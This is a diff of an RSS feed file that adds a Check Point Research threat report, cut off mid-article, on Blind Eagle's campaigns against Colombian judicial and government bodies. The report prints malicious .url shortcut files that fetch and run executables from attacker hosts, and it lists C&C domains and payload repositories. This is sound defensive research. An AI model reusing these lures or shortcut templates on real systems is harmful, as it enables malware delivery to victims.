@@ -1,5 +1,777 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Mon, 10 Mar 2025 11:59:27 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Shellcode Encoded in UUIDs</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Shellcode Encoded in UUIDs, (Mon, Mar 10th)</title><link>https://isc.sans.edu/diary/rss/31752</link><description>&lt;p&gt;I returned from another FOR610&amp;#x5b;&lt;a href="https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/"&gt;1&lt;/a&gt;&amp;#x5d; class last week in London. One key tip I give to my students is to keep an eye on "strange" API calls. In the Windows ecosystem, Microsoft offers tons of API calls to developers. The fact that an API is used in a program does not always mean we are facing malicious code, but sometimes, some of them are derived from their official purpose. One of my hunting rules for malicious scripts is to search for occurrences of the ctypes&amp;#x5b;&lt;a href="https://docs.python.org/3/library/ctypes.html"&gt;2&lt;/a&gt;&amp;#x5d; library. It allows Python to call functions in DLLs or shared libraries.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;I returned from another FOR610[&lt;a href="https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/"&gt;1&lt;/a&gt;] class last week in London. One key tip I give to my students is to keep an eye on &amp;quot;strange&amp;quot; API calls. In the Windows ecosystem, Microsoft offers tons of API calls to developers. The fact that an API is used in a program does not always mean we are facing malicious code, but sometimes, some of them are derived from their official purpose. One of my hunting rules for malicious scripts is to search for occurrences of the ctypes[&lt;a href="https://docs.python.org/3/library/ctypes.html"&gt;2&lt;/a&gt;] library. It allows Python to&amp;nbsp;call functions in DLLs or shared libraries.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Mon, 10 Mar 2025 12:59:28 +0000</lastBuildDate><item><title>Blind Eagle: …And Justice for All</title><link>https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/</link><description>&lt;p&gt;Key Points Introduction APT-C-36, also known as Blind Eagle, is a threat group that engages in both espionage and cybercrime. It primarily targets organizations in Colombia and other Latin American countries. Active since 2018, this Advanced Persistent Threat (APT) group focuses on government institutions, financial organizations, and critical infrastructure. Blind Eagle is known for employing [&amp;#8230;]&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/"&gt;Blind Eagle: …And Justice for All&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Key Points&lt;/h2&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered a series of ongoing campaigns targeting Colombian institutions and government entities since November 2024. The campaigns are linked to &lt;strong&gt;Blind Eagle&lt;/strong&gt;, also known as &lt;strong&gt;APT-C-36&lt;/strong&gt;, and deliver malicious &lt;code&gt;.url&lt;/code&gt; files, which cause a similar effect to the &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; vulnerability.&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt; exposes a user&amp;#8217;s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. This vulnerability can be triggered just by right-clicking, deleting, or dragging the file. While the Blind Eagle malicious file does not exploit this vulnerability, it triggers a WebDAV request in the same uncommon ways, notifying the attacker that the file was downloaded. Finally, when the user clicks on the file, it downloads the next-stage payload via another WebDAV request and executes the malware.&lt;/li&gt;
+
+
+
+&lt;li&gt;Microsoft patched the original vulnerability on November 12, 2024. Just &lt;strong&gt;six days&lt;/strong&gt; later, &lt;strong&gt;Blind Eagle&lt;/strong&gt; included this &lt;code&gt;.url&lt;/code&gt; variant in its attack arsenal and campaigns.&lt;/li&gt;
+
+
+
+&lt;li&gt;The monitored campaigns targeted Colombian judicial institutions and other government or private organizations, with high infection rates. More than &lt;strong&gt;1,600&lt;/strong&gt; victims were affected during one of these campaigns which took place around December 19, 2024. This infection rate is significant considering Blind Eagle&amp;#8217;s targeted APT approach.&lt;/li&gt;
+
+
+
+&lt;li&gt;The malware is often delivered using legitimate file-sharing platforms such as &lt;strong&gt;Google Drive&lt;/strong&gt; and &lt;strong&gt;Dropbox&lt;/strong&gt;. However, in recent campaigns, Blind Eagle has also distributed its payloads through &lt;strong&gt;Bitbucket&lt;/strong&gt; and &lt;strong&gt;GitHub&lt;/strong&gt;.&lt;/li&gt;
+
+
+
+&lt;li&gt;The group utilizes malware and tools which are well-known within underground crime communities, a trend that continues with recent discoveries. To protect its malware, Blind Eagle leverages the Packer-as-a-Service &lt;strong&gt;HeartCrypt&lt;/strong&gt;, which employs a .NET RAT that appears to be a variant of&amp;nbsp; &lt;strong&gt;PureCrypter&lt;/strong&gt;. The final stage payload is &lt;strong&gt;Remcos RAT&lt;/strong&gt;.&lt;/li&gt;
+
+
+
+&lt;li&gt;Blind Eagle has long been suspected to originate from &lt;strong&gt;South America&lt;/strong&gt;. We identified the group&amp;#8217;s operating timezone as &lt;strong&gt;UTC-5&lt;/strong&gt;, which aligns with several &lt;strong&gt;South American&lt;/strong&gt; countries.&lt;/li&gt;
+
+
+
+&lt;li&gt;Operation fail (OPFail) revealed phishing campaigns in early March 2024 in which the group impersonated Colombian banks. These campaigns were highly successful, resulting in the collection of over &lt;strong&gt;8,000&lt;/strong&gt; entries of Personally Identifiable Information (PII).&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;APT-C-36&lt;/strong&gt;, also known as &lt;strong&gt;Blind Eagle&lt;/strong&gt;, is a threat group that engages in both &lt;strong&gt;espionage and cybercrime&lt;/strong&gt;. It primarily targets organizations in &lt;strong&gt;Colombia&lt;/strong&gt; and other &lt;strong&gt;Latin American countries&lt;/strong&gt;. Active since &lt;strong&gt;2018&lt;/strong&gt;, this &lt;strong&gt;Advanced Persistent Threat (APT)&lt;/strong&gt; group focuses on &lt;strong&gt;government institutions, financial organizations, and critical infrastructure&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;Blind Eagle is known for employing &lt;strong&gt;sophisticated social engineering tactics&lt;/strong&gt;, using &lt;strong&gt;phishing emails&lt;/strong&gt; with &lt;strong&gt;malicious attachments or links&lt;/strong&gt; to gain initial access to target systems. Their malware arsenal includes &lt;strong&gt;commodity Remote Access Trojans (RATs)&lt;/strong&gt; such as &lt;strong&gt;NjRAT&lt;/strong&gt;, &lt;strong&gt;AsyncRAT&lt;/strong&gt;, and &lt;strong&gt;Remcos&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;Our research revealed that the group recently expanded its toolkit with additional commodity malware. To protect their malicious executables, Blind Eagle utilizes the &lt;strong&gt;Packer-as-a-Service HeartCrypt&lt;/strong&gt;, which they use to pack a &lt;strong&gt;.NET RAT&lt;/strong&gt; that appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. &lt;strong&gt;Remcos RAT&lt;/strong&gt; remains the final payload.&lt;/p&gt;
+
+
+
+&lt;p&gt;On &lt;strong&gt;November 12, 2024&lt;/strong&gt;, &lt;strong&gt;Microsoft&lt;/strong&gt; patched a newly discovered vulnerability, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43451"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt;. This vulnerability was actively &lt;strong&gt;exploited in the wild&lt;/strong&gt; using &lt;code&gt;.url&lt;/code&gt; files containing &lt;strong&gt;malicious code&lt;/strong&gt;, which could be triggered through &lt;strong&gt;unusual user actions&lt;/strong&gt; such as &lt;strong&gt;right-clicking the file&lt;/strong&gt;, &lt;strong&gt;deleting it&lt;/strong&gt;, or performing a &lt;strong&gt;drag-and-drop operation&lt;/strong&gt;. Exploited as a &lt;strong&gt;zero-day&lt;/strong&gt;, it was used in attacks targeting &lt;strong&gt;Ukraine.&lt;/strong&gt; According to &lt;strong&gt;CERT-UA&lt;/strong&gt;, the campaign was attributed to the threat actor &lt;strong&gt;UAC-0194&lt;/strong&gt;, suspected to be &lt;strong&gt;Russian-affiliated&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;Six days after Microsoft released the patch, &lt;strong&gt;Blind Eagle&lt;/strong&gt; included a variant of this exploit in its attack arsenal and campaigns. While this variant does not actually expose the NTLMv2 hash, it notifies the threat actors that the file was downloaded by the same unusual user-file interactions. On devices vulnerable to &lt;strong&gt;CVE-2024-43451&lt;/strong&gt;, a &lt;strong&gt;WebDAV request&lt;/strong&gt; is triggered even before the user manually interacts with the file with the same unusual behavior. Meanwhile, on both patched and unpatched systems, manually clicking the malicious &lt;code&gt;.url&lt;/code&gt; file initiates the download and execution of the next-stage payload. After incorporating this file into their campaigns, the group targeted mainly Colombian public and private organizations, with high infection rates. More than &lt;strong&gt;1600&lt;/strong&gt; victims were infected during a campaign that occurred around December 19, 2024. Considering Blind Eagle’s targeted APT approach, this infection rate is significant.&lt;/p&gt;
+
+
+
+&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Blind Eagle .url Payloads&lt;/h2&gt;
+
+
+
+&lt;p&gt;&lt;a href="https://www.clearskysec.com/0d-vulnerability-exploited-in-the_wild/"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt; is a vulnerability that exposes a user&amp;#8217;s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. If the compromised account has high privileges and proper mitigations (such as SMB signing and NTLM relay protections) that are not enforced, this could lead to lateral movement, privilege escalation, or even full domain compromise. Eventually, the user, by manually clicking, creates an SMB connection through port 445, which downloads and executes the malicious payload. The exploit reported by CERT-UA:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;[InternetShortcut]
+URL=file://92.42[.]96[.]30/pdp.nacs.gov.ua/Certificate_Activate_45052389_005553.exe
+IconIndex=1
+HotKey=0
+IDList=
+IconFile=C:\\Windows\\System32\\SHELL32.dll
+[{009862A0-0000-0000-C000-000000005986}]
+Prop3=19,9
+[{000214A0-0000-0000-C000-000000000046}]
+[InternetShortcut.A]
+[InternetShortcut.W]
+URL=file://92.42[.]96[.]30/Activation/Certificate+AF8hFgBf-45052389+AF8-005553.exe
+&lt;/pre&gt;
+
+
+
+&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt; affects all supported Windows versions, and it is triggered in uncommon ways:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;em&gt;A single right-click on the file (all Windows versions).&lt;/em&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;em&gt;Deleting the file (Windows 10/11).&lt;/em&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;em&gt;Dragging the file to another folder (Windows 10/11 and some Windows 7/8/8.1 configurations).&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;The &lt;code&gt;.url&lt;/code&gt; file below, used by Blind Eagle against Colombian institutions, is a variant of this CVE, but without the exploiting part, meaning it does not expose the NTLMv2 hash. When manually clicked by the user, this file also downloads malicious files, but instead of using &lt;strong&gt;SMB&lt;/strong&gt; (port: 445), it uses &lt;a href="https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/"&gt;HTTP&lt;/a&gt;. When a URL is in UNC Path format, it first attempts an SMB connection, and if this is unavailable, it attempts WebDAV. However, once the port is specified, which in this case is &lt;code&gt;@80&lt;/code&gt;, the &lt;strong&gt;SMB&lt;/strong&gt; attempt is avoided, and the connection is made directly over &lt;strong&gt;HTTP&lt;/strong&gt; with the &lt;strong&gt;User-Agent&lt;/strong&gt; &lt;code&gt;Microsoft-WebDAV-MiniRedir/10.0.19044&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;[{009862A0-0000-0000-C000-000000005986}]
+Prop3=19,2
+[InternetShortcut]
+IconIndex=11
+IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+IDList=
+URL=file://\\\\62.60[.]226[.]64@80\\file\\4025_3980.exe
+HotKey=0
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;While this variant does not directly exploit the vulnerability, it exhibits unusual behavior by communicating with the server without requiring manual user interaction. However, for the &lt;code&gt;.url&lt;/code&gt; file to download the next-stage payload, the user must manually click it, which triggers a WebDAV request over port 80.&lt;/p&gt;
+
+
+
+&lt;p&gt;This variant serves as a valuable tool for threat actors, as it notifies them when a targeted user downloads the malicious &lt;code&gt;.url&lt;/code&gt; file. Even if the user does not directly execute the file, Blind Eagle can still detect the interaction, providing insight into potential targets.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31211" height="316" src="https://research.checkpoint.com/wp-content/uploads/2025/03/win7_gif.gif" width="800" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 1&lt;/strong&gt; &amp;#8211; Unpatched Vulnerable &amp;#8211; Windows 7, Right Click WebDAV request.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Since Microsoft patched this vulnerability, this unusual behavior no longer occurs. However, manual user interaction can still trigger the download and execution of the malicious payload.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31213" height="359" src="https://research.checkpoint.com/wp-content/uploads/2025/03/win10_gif-1.gif" style="width: 800px; height: auto;" width="800" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 2&lt;/strong&gt; &amp;#8211; Patched &amp;#8211; Windows 10, execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h2 class="wp-block-heading"&gt;Blind Eagle Campaigns&lt;/h2&gt;
+
+
+
+&lt;p&gt;Microsoft published this vulnerability on November 12, 2024. On November 18, we observed the first crafted payload. This &lt;code&gt;.url&lt;/code&gt; file infected both patched and unpatched machines. Since then, we observed multiple campaigns targeting Colombia, and the dropped payload was a .NET RAT that downloads the final stage from &lt;strong&gt;GitHub&lt;/strong&gt; or &lt;strong&gt;BitBucket&lt;/strong&gt;, a &lt;strong&gt;Remcos RAT&lt;/strong&gt;. However, to this day, most of those &lt;code&gt;.url&lt;/code&gt; files are not detected by any Anti-Virus engine on VirusTotal.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31214" height="332" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img1-1024x332.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt; &amp;#8211; First stage .url undetected on VT.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;These ongoing campaigns, based on filenames, appear to primarily target various &lt;strong&gt;Colombian government organizations&lt;/strong&gt;, including the Justice System. These are some of the malicious &lt;code&gt;.url&lt;/code&gt; filenames:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;[Filename] - Juzgados de ejecución de sentencias de bogotá con función de conocimiento programó diligencia de CONTINUACIÓN JUICIO ORAL REFERENCIA.url
+[English] - "Courts of sentence execution in Bogotá with knowledge function scheduled a hearing for the continuation of the oral trial in reference."
+
+[Filename] NOTIFICACIÓN_AUDIENCIA_TOMA_DE_MUESTRA_QUE_INVOLUCREN_IMPUTADO.url
+[English] - "Notification of hearing for the taking of samples involving the defendant."
+
+[Filename] - QUERELLA_JUDICIAL_No7254178000020150023000_Juzgado 9 Municipal de Pequeñas Causas Laborales de Bogotá.url
+[English] - "Judicial Complaint No. 7254178000020150023000, 9th Municipal Court of Small Labor Causes of Bogotá."
+
+[Filename] - este despacho le informa que deberá comparecer ante el Juzgado Penal (6to) del Circuito de Bogot.url
+[English] - "This office informs you that you must appear before the 6th Criminal Court of the Circuit of Bogotá."
+
+[Filename] - en virtud del artículo 220 de la Ley colombiana/Juzgados de Ejecución De Penas y Medidas De Seguridad.url
+[English] - "By virtue of Article 220 of Colombian Law / Courts of Execution of Sentences and Security Measures."
+
+[Filename] - COMUNICADO N° 00239948 PROFERIDO PENAL 00028483 28 DE NOVIEMBRE/OFICIO N° 00239948 PROFERIDO PENAL 00028483 28 DE NOVIEMBRE.url
+[English] - "Communication No. 00239948 issued Criminal 00028483 November 28 / Official Letter No. 00239948 issued Criminal 00028483 November 28."
+
+[Filename] - Oficio Tutelar 0439594 - Proceso N° 03948939-002024.url
+[English] - "Protective Order 0439594 - Case No. 03948939-002024."
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;While operating with the specific malicious file for over two months, the APT group has changed approximately more than ten different C&amp;amp;Cs (Command and Control Servers) for its final stage payload. The attack chain has some small variations, but the &lt;code&gt;.url&lt;/code&gt; files are always part of the campaign during the initial stage.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading"&gt;Campaigns ‘socialismo’ &amp;amp; ‘miami’- January 21-22, 2025&lt;/h3&gt;
+
+
+
+&lt;p&gt;During the campaigns that took place around January 21 and 22, 2025, the APT group distributed multiple &lt;code&gt;.url&lt;/code&gt; files via email through possibly compromised Google Drive accounts. &lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31215" height="836" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img2.png" width="742" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 4&lt;/strong&gt; &amp;#8211; Email with Google Drive link.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The specified file icon in the &lt;code&gt;.url&lt;/code&gt; file is equivalent to the one from the Edge browser. Many of the endpoints contacted by the &lt;code&gt;.url&lt;/code&gt; contain multiple malicious files, though we can not attribute all files hosted on those servers to &lt;strong&gt;Blind Eagle&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;[{009862A0-0000-0000-C000-000000005986}]
+Prop3=19,2
+[InternetShortcut]
+IconIndex=11
+IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+IDList=
+URL=file://\\\\62.60.226[.]64@80\\file\\3819_5987.exe
+HotKey=0
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;The downloaded executable appears to be packed using the Packer as a Service &lt;strong&gt;HeartCrypt&lt;/strong&gt;. This later injects into &lt;code&gt;csc.exe&lt;/code&gt; a .NET executable responsible for unpacking and executing in memory a .NET RAT, which appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. This .NET RAT retrieves various user and machine information such as 1) Username, 2) OS Version, 3) Process name and architecture, 4) Antivirus installed, and other machine specs. After it decrypted its configuration, which is embedded as a resource, we observed the campaign ID &lt;code&gt;socialismo&lt;/code&gt; and the C&amp;amp;C which communicates. The C&amp;amp;C &lt;code&gt;republicadominica2025[.]ip-ddns[.]com&lt;/code&gt;, after it received the user data, responded with a URL to download and execute the next stage payload. The final stage is downloaded from the GitHub repository &lt;code&gt;Oscarito20222/file&lt;/code&gt;, and the malware is the known Remote Access Trojan &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;elyeso.ip-ddns[.]com:30204&lt;/code&gt; and Botnet name &lt;code&gt;redtube&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31216" height="331" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img3-1024x331.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 5&lt;/strong&gt; &amp;#8211; Campaign socialismo attack chain.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Both of the domain names from the .NET RAT and the Remcos RAT resolve to the same IP address &lt;code&gt;177.255.85[.]101&lt;/code&gt;. The group has used this IP for multiple Remcos C&amp;amp;Cs through January &amp;amp; February campaigns:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;amuntgroupfree.ip-ddns[.]com
+donato.con-ip[.]com
+elyeso.ip-ddns[.]com
+comina998.ddns-ip[.]net
+republicadominica2025.ip-ddns[.]com
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;It is worth mentioning that the attacker&amp;#8217;s GitHub repository is used in multiple Blind Eagle campaigns to deliver the final stage payload, &lt;strong&gt;Remcos.&lt;/strong&gt; This repository is constantly updated with new files that communicate with the latest C&amp;amp;C. All the repository updates were committed in the timezone &lt;code&gt;-0500&lt;/code&gt;, which could possibly indicate Blind Eagle’s country of origin aligns with South American countries. Examples of commits:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;==================================================
+[2025-02-04T20:00:59Z] Author: Oscarito20222	
+tree 62c86b52fabaaecc398b902965e58c4154edc427
+parent a84f5a384b090598cd29be6b2492cbb45c73c3ac
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1738699259 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1738699259 -0500
+
+Add files via upload
+ * fuck.exe - 3bd90557615ef95e4244bdbaa8e0e7fd949cdd3a
+ * redtube.exe - 758c73ab9706ae6977f9b4601c20b3667836d3ef
+ * roma.exe - ba95ea1dcc744566a9552d9665feff035925a5c5
+==================================================
+[2025-02-06T15:51:50Z] Author: Oscarito20222	
+tree 220a606655d64d03762d319c5f5b80038e5bc13c
+parent 29335b62acef53cb7076f81b8fa25e9baf6d9994
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1738857110 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1738857110 -0500
+
+Delete roma.exe
+==================================================
+[2025-02-06T15:52:02Z] Author: Oscarito20222	
+tree e9e56beee7cf526a4df97e35f2df9458cae0ec23
+parent b7f7fe7ce6d5eb7453ca5edd616bc9f071cd3ea5
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1738857122 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1738857122 -0500
+
+Delete redtube.exe
+==================================================
+[2025-02-06T15:52:11Z] Author: Oscarito20222	
+tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
+parent d2279dc66302d8afad41c82ad81d0733e1f2273d
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1738857131 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1738857131 -0500
+
+Delete fuck.exe
+==================================================
+[2025-02-06T15:52:33Z] Author: Oscarito20222	
+tree 5d1edc470b4b33a31f982077e08b2e61f438feab
+parent a7b74e834eddb6eb9a23a268c7088b3aeba493d4
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1738857153 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1738857153 -0500
+
+Add files via upload
+ * normales.exe - 3d3248ad14dce8b6fcf416d56d8de52b07b549e7
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;The &lt;strong&gt;GitHub account&lt;/strong&gt; also contains another repository named &lt;code&gt;diciembre&lt;/code&gt;, which includes an archive with a &lt;code&gt;.vbs&lt;/code&gt; file. Notably, this &lt;strong&gt;commit from two years ago&lt;/strong&gt; was made in the same &lt;strong&gt;UTC-5 timezone&lt;/strong&gt; as the recent activity.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31217" height="362" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img4-1024x362.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 6&lt;/strong&gt; &amp;#8211; Blind Eagle GitHub account.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This repository, which was “untouched” for over two years, was updated on February 25, 2025, and introduced a new &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;21ene.ip-ddns[.]com:30204&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31218" height="316" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img5-1024x316.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 7&lt;/strong&gt; &amp;#8211; Recent &lt;code&gt;diciembre&lt;/code&gt; repository campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading"&gt;Campaigns ‘PARAISO’, ‘PARAISO2’, ‘marte’ &amp;amp; ‘saturno’ &amp;#8211; December 2024&lt;/h3&gt;
+
+
+
+&lt;p&gt;Although similar to the previous campaign, this one leveraged &lt;strong&gt;Bitbucket&lt;/strong&gt; instead of &lt;strong&gt;GitHub&lt;/strong&gt; as the final-stage distribution platform.&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Campaign&lt;/th&gt;&lt;th&gt;.NET RAT C&amp;amp;C&lt;/th&gt;&lt;th&gt;Remcos C&amp;amp;C&lt;/th&gt;&lt;th&gt;Remcos ITW&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-10&lt;/strong&gt;] &lt;strong&gt;marte&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net -&amp;gt; 181.131.217.244&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;bitbucket[.]org/facturacioncol/fact/downloads/FileHosting.exe&lt;br /&gt;bitbucket[.]org/facturacioncol/fact/downloads/luna.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-11&lt;/strong&gt;] &lt;strong&gt;saturno&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;bitbucket[.]org/facturacioncol/fact/downloads/Out2.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-19&lt;/strong&gt;] &lt;strong&gt;PARAISO&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/ROSAS.exe&lt;br /&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/Final1278685280.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-19&lt;/strong&gt;] &lt;strong&gt;PARAISO2&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;br /&gt;17dic.ydns[.]eu -&amp;gt; 181.131.217.244&lt;/td&gt;&lt;td&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/AD.exe&lt;br /&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/Simpson.exe&lt;br /&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/Final1278685280.exe&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;In these campaigns, two Bitbucket repositories were abused and contained &lt;strong&gt;Remcos RAT&lt;/strong&gt; executable files, which were uploaded to &lt;strong&gt;Bitbucket&lt;/strong&gt; around &lt;strong&gt;December 2024&lt;/strong&gt;. Considering this APT group’s activity and approach, a significant number of victims ultimately downloaded these malicious executables.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
